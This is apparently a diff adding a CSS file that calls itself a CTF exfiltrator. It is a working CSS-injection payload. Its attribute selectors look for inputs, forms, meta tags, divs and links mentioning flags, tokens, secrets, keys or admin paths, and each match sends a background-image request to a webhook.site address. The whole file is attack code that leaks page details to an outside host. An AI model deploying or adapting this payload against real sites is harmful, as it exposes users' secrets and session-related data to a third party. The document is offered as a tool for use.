@@ -1,0 +1,28 @@
+/* Basic CSS Exfiltrator for CTF Challenges */
+/* Webhook: https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497 */
+
+/* Extract input values that might contain flags */
+input[value*="flag" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=input_flag&value=found); }
+input[value*="ctf" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=input_ctf&value=found); }
+input[value*="flag{" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=input_flag_bracket&value=found); }
+
+/* Extract input names that might be interesting */
+input[name*="token" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=input_name_token&name=found); }
+input[name*="secret" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=input_name_secret&name=found); }
+input[name*="key" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=input_name_key&name=found); }
+
+/* Extract form actions */
+form[action*="admin" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=form_admin&action=found); }
+form[action*="flag" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=form_flag&action=found); }
+
+/* Extract meta content */
+meta[content*="flag" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=meta_flag&content=found); }
+meta[content*="ctf" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=meta_ctf&content=found); }
+
+/* Extract div content using :has selector */
+html:has(div[class*="flag" i]) { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=div_class_flag&found=true); }
+html:has(div[id*="secret" i]) { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=div_id_secret&found=true); }
+
+/* Extract anchor hrefs */
+a[href*="flag" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=anchor_flag&href=found); }
+a[href*="/admin" i] { background: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?type=anchor_admin&href=found); }
